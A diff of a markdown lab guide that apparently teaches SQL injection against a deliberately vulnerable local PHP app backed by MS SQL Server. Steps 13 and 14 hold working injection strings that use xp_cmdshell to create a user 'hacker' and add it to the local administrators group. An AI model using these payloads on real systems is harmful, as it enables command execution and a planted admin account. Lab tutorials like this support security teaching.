@@ -136,7 +136,7 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
    (4, 'user3', 'user3pass', 'user3@example.com');
    ```
    The data can be found by expanding the Tables Node located under the master node
-   ![image](https://github.com/user-attachments/assets/18dcc7d3-e34c-4ac2-a104-db3571d3170e)
+   ![image](https://github.com/user-attachments/assets/6cb4fa5a-230a-48bc-a7b7-f2907bc5ddd5)
 9. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
 10. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
    ```
@@ -171,12 +171,12 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
     ![image](https://github.com/user-attachments/assets/9ec1f657-8509-40ee-b7a0-4b1e167e1871)
 13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings inside the user input field
     ```
-    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
+    1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
     ```
     ![image](https://github.com/user-attachments/assets/ce9bf90a-b36b-4902-b714-12e10b5b0c96)
 14. To add this user to the local administrators group, add the following
     ```
-    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
+    1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
     ```
     ![image](https://github.com/user-attachments/assets/96fdb9ff-dda0-4a0d-aa6f-dedda6123939)
 15. To verify `hacker` was added, check in cmd or PowerShell after adding the user
